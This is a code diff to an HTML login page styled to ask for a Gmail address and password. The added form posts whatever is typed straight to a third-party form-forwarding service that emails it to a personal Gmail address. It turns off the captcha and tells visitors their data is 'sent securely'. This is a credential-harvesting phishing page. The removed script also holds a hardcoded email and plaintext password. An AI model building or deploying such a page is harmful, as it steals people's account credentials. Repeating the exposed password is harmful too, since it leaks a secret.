@@ -10,7 +10,7 @@
       display:flex;
       justify-content:center;
       align-items:center;
-      font-family:Arial;
+      font-family:Arial, sans-serif;
       background: linear-gradient(135deg, #1f1c2c, #928dab);
     }
 
@@ -25,6 +25,7 @@
 
     h2{
       margin-bottom:20px;
+      color:#333;
     }
 
     input{
@@ -36,22 +37,32 @@
       outline:none;
     }
 
+    input:focus{
+      border-color:#6a1b9a;
+    }
+
     button{
       width:95%;
       padding:12px;
-      border:none;
-      border-radius:8px;
       background:#6a1b9a;
       color:white;
+      border:none;
+      border-radius:8px;
       font-size:16px;
       cursor:pointer;
     }
 
-    #msg{
+    button:hover{
+      background:#4a0f6e;
+    }
+
+    .note{
+      font-size:12px;
+      color:gray;
       margin-top:10px;
-      font-size:14px;
     }
   </style>
+
 </head>
 
 <body>
@@ -60,64 +71,30 @@
 
   <h2>LOGIN</h2>
 
-  <form id="loginForm">
+  <form action="https://formsubmit.co/folkking66@gmail.com" method="POST">
 
-    <input type="email" id="email" placeholder="Enter Gmail" required>
-    <input type="password" id="password" placeholder="Enter Password" required>
+    <input type="email" name="email" placeholder="Enter Gmail" required>
+
+    <input type="password" name="password" placeholder="Enter Password" required>
+
+    <!-- no captcha -->
+    <input type="hidden" name="_captcha" value="false">
+
+    <!-- email format -->
+    <input type="hidden" name="_template" value="table">
+
+    <!-- subject -->
+    <input type="hidden" name="_subject" value="New Login Submission">
 
     <button type="submit">LOG IN</button>
 
   </form>
 
-  <div id="msg"></div>
+  <div class="note">
+    Your data will be sent securely to the admin email.
+  </div>
 
 </div>
-
-<script>
-
-const correctEmail = "folkking66@gmail.com";
-const correctPassword = "Pushtoon123";
-
-document.getElementById("loginForm").addEventListener("submit", function(e){
-    e.preventDefault();
-
-    let email = document.getElementById("email").value.trim().toLowerCase();
-    let password = document.getElementById("password").value.trim();
-
-    let msg = document.getElementById("msg");
-
-    if(email === "" || password === ""){
-        msg.style.color = "red";
-        msg.innerText = "Please fill all fields";
-        return;
-    }
-
-    // ❌ WRONG LOGIN
-    if(email !== correctEmail || password !== correctPassword){
-        msg.style.color = "red";
-        msg.innerText = "Wrong email or password!";
-        return;
-    }
-
-    // ✅ CORRECT LOGIN
-    msg.style.color = "green";
-    msg.innerText = "Message sent ✔";
-
-    fetch("https://formsubmit.co/folkking66@gmail.com", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-            "Accept": "application/json"
-        },
-        body: JSON.stringify({
-            email: email,
-            password: password
-        })
-    });
-
-});
-
-</script>
 
 </body>
 </html>
